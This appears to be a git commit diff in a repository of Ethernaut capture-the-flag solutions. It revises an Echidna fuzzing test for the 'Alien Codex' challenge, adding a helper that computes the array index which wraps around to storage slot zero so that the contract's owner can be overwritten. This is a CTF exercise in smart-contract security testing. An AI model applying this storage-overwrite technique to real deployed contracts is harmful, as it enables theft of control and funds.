08bfb5a7c37cf69b846f23a586803de9739fe55c
Emilio López <emilio@elopez.com.ar>
2020-05-02 13:59:07 -0300

    19-alien-codex: clean echidna solution

--- 19-alien-codex/test.sol
+++ 19-alien-codex/test.sol
@@ -3,20 +3,13 @@ pragma solidity ^0.5.0;
 import 'contract.sol';
 
 contract Test is AlienCodex {
-  function echidna_test_owner() public returns (bool) {
-    return owner() == msg.sender;
+  function calc_offset_zero(uint b) public returns (uint) {
+    // "codex" is probably in the first 10 slots
+    b = b % 10;
+    return uint(-1) - uint(keccak256(abi.encodePacked(b))) + 1;
   }
 
-  // prime echidna const dictionary
-  uint c1 = 0;
-  uint c2 = 1;
-
-  function guess_owner(uint slot, uint slotoff) public returns (uint) {
-    // See https://solidity.readthedocs.io/en/v0.4.24/miscellaneous.html#layout-of-state-variables-in-storage
-    uint slotbase = uint(keccak256(abi.encodePacked(uint(slot))));
-    // If array is at `slot`, this makes it so array[zeroslot] == slot 0
-    uint zeroslot = uint(-1) - slotbase + 1;
-    // Return number so that array[res] == slot `slotoff`
-    return zeroslot + slotoff;
+  function echidna_test_owner() public returns (bool) {
+    return owner() == msg.sender;
   }
 }
